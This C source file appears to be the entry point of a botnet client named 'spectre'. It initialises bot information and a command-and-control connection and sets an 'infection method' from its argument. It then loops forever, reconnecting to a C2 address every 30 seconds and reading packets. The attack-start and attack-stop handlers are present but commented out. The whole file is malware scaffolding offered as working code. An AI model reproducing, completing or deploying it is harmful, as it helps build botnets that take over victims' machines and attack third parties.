
#include <spectre_def.h>
#include <protocol.h>
#include <stdlib.h>
#include <debug.h>

bool handle_packet(Packet *packet);

_Noreturn void start(char *payload) {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        debug_log("WSAStartup failed: %d", WSAGetLastError());
        exit(1);
    }
#endif
    init_bot_info();
    init_cnc_connection();

    set_infection_method(payload);

    print_info();
    debug_log("argv: %d", ArgTypeStringMap);

    while (true) {
        debug_log("Connecting to %s:%d", CNC_ADDR, strtol(CNC_PORT, NULL, 10));

        while (!cnc_conn_open()) {
#ifdef DEBUG
            SLEEP(1);
#else
            SLEEP(30);
#endif
        }

        while (is_cnc_connected()) {
            Packet *packet = read_packet();

            if (packet == NULL) break;

            if (!handle_packet(packet)) {
                break;
            }

            debug_packet(packet);
        }

        cnc_conn_close();
        debug_log("Disconnected!");
    }
}

bool handle_packet(Packet *packet) {
//    switch (packet->type) {
//        case PacketTypeStartAttack:
//            start_attack(packet);
//            break;
//        case PacketTypeStopAttack:
//            stop_attack(packet);
//            break;
//        default:
//            return false;
//    }

    return true;
}


int main(int argc, char *argv[]) {
    char *payload = argc <= 1 ? "unknown" : argv[1];
    debug_log("Starting with payload: %s", payload);
    start(payload);
}
